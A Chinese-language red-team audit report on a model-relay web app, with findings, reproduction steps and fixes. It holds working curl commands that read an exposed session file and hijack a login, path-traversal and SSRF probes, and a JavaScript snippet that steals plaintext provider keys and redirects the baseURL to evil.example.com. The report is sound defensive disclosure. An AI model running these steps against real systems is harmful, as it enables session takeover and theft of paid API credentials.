# 红队审计报告：模型中继与供应商配置链路（polaris-lite）

> 审计对象：`server/relay-core.mjs`、`server/auth-session.mjs`、`server/prod-server.mjs`、`vite.config.ts`、`plugins/config-manager`、`plugins/model-admin`、`plugins/real-engine`、`plugins/mock-auth`、`plugins/relay-hosts.json`、`src/core/bus.ts`。
> 方法：全量读码 + 对运行中的 dev server（vite，0.0.0.0:9825）与 prod server（`node server/prod-server.mjs`）做黑盒 curl 实测。未修改任何源码；`plugins/relay-hosts.json` 临时修改后已恢复原样。
> 日期：2026-11-18。视角：攻击者（同网段主机 / 公网隧道入口 / 恶意页面 / 恶意插件）。

---

## 严重度速览

| 级别 | 数量 | 编号 |
|---|---|---|
| P0 | 3 | V1 未登录可读明文供应商 key（dev 静态服务）；V2 会话文件任意读取 → 会话劫持；V3 供应商 key 硬编码进公开插件 bundle |
| P1 | 4 | V4 路径穿越（prod 静态服务，评委预判属实）；V5 cap.config 免登录读写（含 key）；V6 供应商配置存 localStorage + cap 总线跨插件明文可读；V7 服务器无响应体大小/时长上限 |
| P2 | 3 | V8 body 上限用 `req.destroy()` 粗暴断连；V9 登录限速仅按 remoteAddress、锁窗口仅 60s；V10 中继 502 错误体回显上游原始错误 |
| 通过 | 6 | SSRF 白名单、redirect 防跳转、未登录 401、CORS、key 不落日志、SSE 背压/中断 |

---

## 漏洞详情

### [P0] V1 未登录可直接读取供应商明文 API Key（dev 形态，静态服务无鉴权）

**复现（无需任何 cookie，LAN 内任一台主机即可）：**

```bash
# dev server 监听 0.0.0.0:9825（vite.config.ts server.host='0.0.0.0'）
curl http://172.16.0.152:9825/plugins/model-admin/plugin.js | grep -o "sk-[a-f0-9]\{20,\}"
# → sk-<REDACTED-2026-11-18>   （实网拿到真实 key）

# 未编译源码同样可读：
curl http://127.0.0.1:9825/plugins/model-admin/index.ts | grep -o "sk-..."
# → 同上

# 登录会话文件（含全部有效 sid）也能未登录直读：
curl http://127.0.0.1:9825/.polaris-lite/auth-sessions.json
# → {"34b23f5a...":{"user":{"id":"u-mosiadmin",...}}, ...}
```

**根因：**
- `vite.config.ts:26` `host: '0.0.0.0'`——dev server 暴露到整个局域网/隧道；
- Vite dev server 会原样服务 `public/`（含 `public/plugins/*/plugin.js`）与源码模块；`plugins/model-admin/index.ts:71` 的 `initialConfigs()` 把真实 key 写死在源码里，构建产物 `dist/plugins/model-admin/plugin.js`（即 `public/plugins/...` 的构建来源）随之携带；
- `.polaris-lite/` 位于项目根目录，dev server 的文件服务/`/,@fs` 与 SPA fallback 对点开头路径无遮蔽。

**影响：** 攻击者拿 key 直接消费用户在 MOSI 的付费额度；`auth-sessions.json` 直读引出 V2。

**修复建议：**
1. key 一律只存服务端（哪怕 lite 形态也可走 `/api/config` 类受保护端点），前端只拿 masked 值；
2. 立即从源码/bundle 中移除 `initialConfigs()` 里的真实 key，并**轮换该 key**（已视为泄露）；
3. dev server `host` 改回 `127.0.0.1`（R2 方案原稿即如此要求，现网配置回退了）；
4. `.polaris-lite/` 移出项目根或加入 dev server 拒绝清单。

---

### [P0] V2 会话文件任意读取 → 登录会话劫持（dev 形态）

**复现：**

```bash
# ① 未登录读会话表
SID=$(curl -s http://127.0.0.1:9825/.polaris-lite/auth-sessions.json \
  | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{const j=JSON.parse(d);const now=Date.now();const live=Object.entries(j).filter(([k,v])=>v.expiresAt>now).sort((a,b)=>b[1].expiresAt-a[1].expiresAt);console.log(live[0][0])})")
# ② 直接顶用会话
curl http://127.0.0.1:9825/api/auth/status -H "Cookie: plite.sid=$SID"
# → {"status":"authenticated","user":{"id":"u-boss","name":"boss"},...}
# ③ 用被劫持会话打中继（带供应商 key 即可跑量）
curl -X POST http://127.0.0.1:9825/api/model-relay -H "Cookie: plite.sid=$SID" \
  -H "Authorization: Bearer sk-..." -H "Content-Type: application/json" \
  -d '{"url":"https://api.mosi.cn/v1/chat/completions","body":{"model":"nex-n2.6","messages":[{"role":"user","content":"hi"}]}}'
# → 200，真实计费调用成功
```

**根因：** `auth-session.mjs:19` 把会话表持久化为项目根下 `.polaris-lite/auth-sessions.json`（设计是「重启不掉线」，`saveSessions` 每次变更全量明文落盘），而 dev 静态服务能未登录读到该文件（V1 的文件面）。sid 即完整身份凭据，读到即接管。

**影响：** 未登录攻击者 → 任意登录用户 → 中继 + 全部需登录能力。

**修复建议：** 会话表不要落盘到 web 可达目录（内存即可，重启掉线是可接受代价；或落盘到系统用户目录并 0600）；dev 静态服务对 `.polaris-lite/`、dotfile 一律 404；sid 落盘前做哈希（文件泄露 ≠ 可用凭据）。

---

### [P0] V3 供应商 API Key 明文硬编码在前端源码与构建产物中

**复现：**

```bash
curl -s http://127.0.0.1:9825/plugins/model-admin/plugin.js | grep -c "sk-<REDACTED-2026-11-18>"
# → 1（无 cookie、LAN 可达；dist 形态同）
```

**根因：** `plugins/model-admin/index.ts:65-78` `initialConfigs()` 返回带真实 `apiKey` 的初始供应商；该数组经 `saveConfigs()` 写入 `cap.config`（localStorage），且源码本身被 vite 打进公开 bundle。`real-engine` 从 `cap.config` 读到的也是这份明文。

**影响：** key 泄露即额度被盗用；且 bundle 公开可达（V1），无需登录。

**修复建议：** 初始配置只放 `{name, baseURL, models}` 骨架，key 留空由用户录入；轮换现 key；构建产物中加入密钥扫描门禁（正则 `sk-[0-9a-f]{32}` 级别）。

---

### [P1] V4 prod 静态服务路径穿越——评委预判属实，但实际可利用性为「SPA fallback 吞掉」+「读 dist 外文件失败即回退 index.html」

**复现（prod：`pnpm build && node server/prod-server.mjs`）：**

```bash
curl --path-as-is -o /dev/null -w "%{http_code}\n" http://127.0.0.1:9825/%2e%2e/package.json   # 200（SPA fallback 的 index.html）
curl --path-as-is http://127.0.0.1:9825/..%2f.polaris-lite%2fauth-owner.json                   # 200 index.html，非目标文件
```

**根因：** `server/prod-server.mjs:22-26` `decodeURIComponent(urlPath)` 后直接 `join(dist, urlPath)`，无 `..` 归一化/前缀校验（relay judging 评委 B/A 均已点名）。实测：`join` 后路径逃出 `dist/` 时 `existsSync` 为假 → 走 SPA fallback 返回 index.html，**本次未成功读出 dist 外真实文件**；但 `..` 序列被静默接受、逻辑上仍在拼接 dist 外路径，属未爆炸的穿越引信（Windows 反斜杠、符号链接目录、dist 内敏感文件等变体未穷尽）。

**修复建议：** `resolve(dist, '.' + normalize(urlPath))` 后校验 `resolved.startsWith(dist + sep)`，否则 403；或直接换 `sirv`/`serve-static`。

---

### [P1] V5 cap.config 免登录读写（isPublicCap 豁免）——浏览器内可达，但**无 HTTP 通道**，实际泄露面是 V1/V6

**结论（实测）：** `src/core/bus.ts:54-61` 确实把 `cap.config` 列入 `isPublicCap`：未登录时总线不拦 `cap.config` 的 get/set/setAll/remove。但 cap 总线是**纯浏览器进程内对象**，实测不存在任何 HTTP 端点能把 cap.dispatch 暴露出去（`POST /api/cap` → 404；`/api/config` 等均 404/SPA fallback）。因此「跨网络未登录读 cap.config」不成立；成立的是两条间接路径：
1. **同页面恶意/被入侵插件**：任意插件（含动态加载的第三方插件）都可 `dispatch({target:'cap.config', action:'get', payload:{namespace:'model-admin'}})` 拿到 `providers[]` **明文 key**——`config-manager/index.ts:44-45` get 无 key 时返回整个 section，无任何脱敏；且 set/setAll 也免登录，可篡改 baseURL 做**中间人**（把对话流量指到攻击者服务器，连带截获 Authorization key）。
2. **localStorage 直读**：key 的持久化本体是 `localStorage['config-manager.store.v1']`，任何能跑 JS 的插件/XSS 脚本直接读。

**复现（浏览器控制台 / 恶意插件 setup 内）：**

```js
const res = await api.dispatch({ target:'cap.config', action:'get', payload:{ namespace:'model-admin' } });
res.data.value.providers[0].apiKey; // 明文 sk-...
// 或直接：
JSON.parse(localStorage.getItem('config-manager.store.v1')).model_admin.providers[0].apiKey;
// 篡改（中间人）：
api.dispatch({ target:'cap.config', action:'setAll', payload:{ namespace:'model-admin', value:{ providers:[{...provider, baseURL:'https://evil.example.com/v1'}]}}} );
// real-engine 会监听 config-changed 热更新，下一轮对话即带 key 打攻击者服务器
```

**根因：** `bus.ts:59` 豁免注释自己承认「配置含供应商 key，由面板自行管控」，但面板只做展示打码（`model-admin/index.ts:41-43 publicView`），存储层与总线层均无脱敏/审计。relay judging「共性备注」也登记过此缺口（「三案均未处理」）。

**修复建议：** `cap.config` 移出 `isPublicCap`；或 config-manager 对 `model-admin` namespace 做写限制（仅 model-admin 插件可写）+ 读脱敏（明文 key 仅允许 `getPlain` 这类显式动作、并给 cap-panel 审计入链）；长期方向是 key 只存服务端。

---

### [P1] V6 供应商配置跨插件明文可读 + 广播链携带 key

**根因/路径：**
- `model-admin/index.ts:52` `saveConfigs()` 把**未打码**的完整配置（含 apiKey）写入 cap.config；
- `real-engine/index.ts:184-199` 直接从 cap.config 读明文 providers；读不到再走 `cap.model.admin/resolveActive`（`index.ts:92-99` 返回的也是**明文** config，注释自述「含明文 key」）；
- `model-config-changed` 广播（`model-admin/index.ts:55-62`）虽用 `publicView` 打码，但 `config-changed`（config-manager 原始事件）不携带值、只带 namespace/key，这两条尚可；**真正的明文出口是 cap.config get 与 cap.model.admin 的 getPlain/resolveActive**——任何声明了 `cap.config` 的插件（real-engine 声明了，`real-engine/index.ts:175`）都能读。新增插件只要在 manifest 写 `capabilities:['cap.config']` 即可获得同样权限（`assertAllowed` 是**自声明制**，`bus.ts:93-99`）。

**影响：** 供应链面：安装任意第三方插件 = 交出所有供应商 key。

**修复建议：** 明文 key 收敛到「仅 real-engine 经专用一次性通道」；`cap.model.admin` 增加 `test`/`proxy` 动作代替返回明文；插件 capability 声明加敏感 cap 审批（至少对 `cap.config` 的 `model-admin` namespace 做提供方校验）。

---

### [P1] V7 中继对上游响应无大小/时长上限，慢速攻击可堆积连接

**实测：**
- 上游 34.7s 长流式响应（21KB）全程透传正常，期间并发请求不受影响（事件循环未阻塞，背压逻辑工作正常）——正常功能面 OK；
- 但 `relay-core.mjs` 对**上游**没有：最大响应字节数、总超时、idle 超时。`fetch(target)` 无 timeout；若上游（或被塞进白名单的恶意域，见 V-通过项注释）故意 1 字节/分钟地滴流，`reader.read()` 永远 pending，连接与内存（每连接一个 reader + buffer）无限期占用；
- 慢请求体（dribble）实测：合法 cookie 下 7s 内服务端不响应也不断开（`Content-Length` 到齐前 `req.on('end')` 不触发），5 个并发 dribbler 中 2 个 8s 后仍挂着；node http server 默认无 `server.requestTimeout` 之外的慢速防护，dev vite 同样。配合 `0.0.0.0` 暴露，可从 LAN 用少量连接长期占坑。

**复现：**
```bash
# 慢滴流（合法会话）：Node http 客户端每 300ms 写 2 字节，服务端 7s 内既不 400 也不超时
# 大响应：max_tokens:8000 → 34s 透传，服务端无任何上限拦截
```

**修复建议：** `AbortSignal.timeout`/手动定时器给上游 fetch 加总超时（如 120s）+ idle 超时；响应字节数累计超限（如 32MB）即 abort；`req.setTimeout` 处理慢请求体；prod 形态加 `server.requestTimeout`/`headersTimeout`。

---

### [P2] V8 请求体超限用 `req.destroy()` 粗暴断连

**复现：** 6MB body POST → 连接被直接销毁（curl 收到 `000`/空回复），而非 413。攻击者可反复触发使 vite/node 产生大量 RST；对客户端也无诊断信息。**修复：** `res.writeHead(413)` + `res.end` 后再 `req.destroy()`（或 `req.resume()` 排干后响应）。

### [P2] V9 登录限速可被绕过/会话固定面

**实测：** 5 次失败后 429，但仅按 `req.socket.remoteAddress` 计数（`auth-session.mjs:139`）——反代/隧道后全体用户共享同一计数（可被用来锁死真 owner 登录），而攻击者换出口 IP 即重置；锁窗口 60s，`until` 每次失败顺延但上限未封顶，长锁只对共享出口有效。另：`change-credentials` 用 `owner.passwordHash !== sha256(...)` 普通比较（`auth-session.mjs:194`，非 timingSafeEqual，login 路径已用 `safeEqual`）——低危但同文件双标准。**修复：** 限速键加 username 维度、锁窗口指数退避并封顶；比较统一走 `safeEqual`。

### [P2] V10 502 错误体回显上游原始错误

**复现：** `{"error":"TypeError: fetch failed"}`、上游 4xx/5xx 原文经 `String(e)`/透传返回。当前未观察到 key 回显（Authorization 只进转发头），但上游错误文本可能携带内部端点/配额信息。**修复：** 502 统一固定文案，详情进服务端日志（logger 分级，不落 key）。

---

## 通过项（攻击失败清单）

| # | 攻击 | 实测结果 | 依据 |
|---|---|---|---|
| P1 | 未登录打中继 | `401 {"error":"unauthorized","code":"SESSION_REQUIRED"}`（dev/prod 一致；LAN IP 直打同样 401） | `relay-core.mjs:42-46` |
| P2 | SSRF：http 明文上游 | 400 `only https upstream allowed` | `relay-core.mjs:57` |
| P3 | SSRF：白名单子域（`evil.api.openai.com`） | 400 `host not allowed`（`allowed.has(hostname)` 精确匹配，无后缀/通配放宽） | `relay-core.mjs:58` |
| P4 | SSRF：userinfo 欺骗（`https://api.openai.com@evil.com`）、`#` 片段、IPv6 字面量、十进制/十六进制 IP、`127.0.0.1` | 全部 400，hostname 解析后均不命中白名单 | `new URL()` 语义 + 白名单 |
| P5 | SSRF：白名单域 + 任意端口（`:8443`） | 放行至 fetch（端口不在校验范围）→ 连接失败 502。**残留风险**：白名单域若某端口开了内网服务可被探；建议校验 `port===''`（仅 443） | `relay-core.mjs:56-60` |
| P6 | SSRF：redirect 跳转到任意外域 | `redirect:'manual'`，3xx 不会自动跟随（本次实测上游无 30x 样本，机制以代码为准） | `relay-core.mjs:81` |
| P7 | 开放代理：转发任意 https API | 不成立——host 白名单硬卡死，path 虽不限但域名不可控；白名单域上 POST 任意 path（`/v1/anything`）仅 404/405，无通用转发价值 | `relay-core.mjs:58` |
| P8 | CRLF 注入请求行/头（path 带 `%0d%0a`） | fetch 会抛错 → 502，未观察到头注入 | fetch 层校验 |
| P9 | CORS 任意源携带凭据 | 全端点无任何 `Access-Control-*` 响应头；OPTIONS 预检 405；`SameSite=Lax` + 无 ACAO，跨站携带 cookie 的 POST 会被浏览器拦截 | dev/prod 实测响应头 |
| P10 | key 落日志/回显 | 中继响应体（含 502/400）未发现 Authorization 原文回显；服务端无业务日志打印 headers | `relay-core.mjs` 无 logger 调用 |
| P11 | relay-hosts.json 热改提权 | 运行中修改文件**不生效**（`loadExtraHosts()` 仅在 `createRelayMiddleware` 构造时读取一次，`relay-core.mjs:31`），改完仍 400；且全仓无任何代码写该文件（grep 清零）——修改需落盘者有服务器文件写权限，届时已无需经此提权。**注意**：重启后生效，故该文件应纳入部署完整性校验 | `relay-core.mjs:20-26,31` |
| P12 | SSE 正常结束/客户端中断 | 流式逐块到达、`data: [DONE]` 后连接正常关闭（1.6s 完成）；客户端中途断开 2s 后服务端仍健康（`res.on('close') → abort.abort()` 生效） | `relay-core.mjs:75,92-103` |
| P13 | 事件循环阻塞 | 34s 大流式透传期间并发 status 请求 2-3ms 响应 | 背压 `drain` 实现正确 |

---

## 附：未能在黑盒下验证的项（如实交代）

1. **DNS rebinding**：需可控 DNS 与浏览器侧差异，curl 无法直接复现；但中继校验发生在 `new URL()` 后、`fetch()` 前，**校验的是 hostname 字符串而非解析结果**——若攻击者让 `api.mosi.cn` 形态的域名（如注册 `api.mosi.cn.evil.io` 指向内网）不成立（精确匹配不过），唯一路径是「白名单域本身被劫持 DNS 指向内网」，属供应链风险而非本代码缺陷。
2. **`fetch` 对重定向后的二次校验**：`redirect:'manual'` 已杜绝自动跟随，未实测 30x 样本（mosi 无跳转端点）。
3. **prod 形态的 vite 特有暴露**（`/@fs`、源码服务）不适用于 prod——prod 走 `serveStatic(dist)`；但 prod 的路径穿越引信仍在（V4）。

## 修复优先级建议

1. **立即**：轮换 `sk-a3a57fad...` key；从 `model-admin/index.ts` 初始配置删除明文 key；dev `host` 收紧 `127.0.0.1`；`.polaris-lite/` 移出 web 可达目录（V1/V2/V3）。
2. **本周**：`cap.config` 移出 `isPublicCap` 或对 `model-admin` namespace 加提供方校验 + 读脱敏（V5/V6）；prod 静态服务路径归一化（V4）。
3. **迭代**：上游响应大小/超时上限、慢速连接防护（V7）；413 语义化（V8）；限速键与常量时间比较（V9）；502 文案收敛（V10）；relay-hosts.json 加载加完整性校验/管理面鉴权。
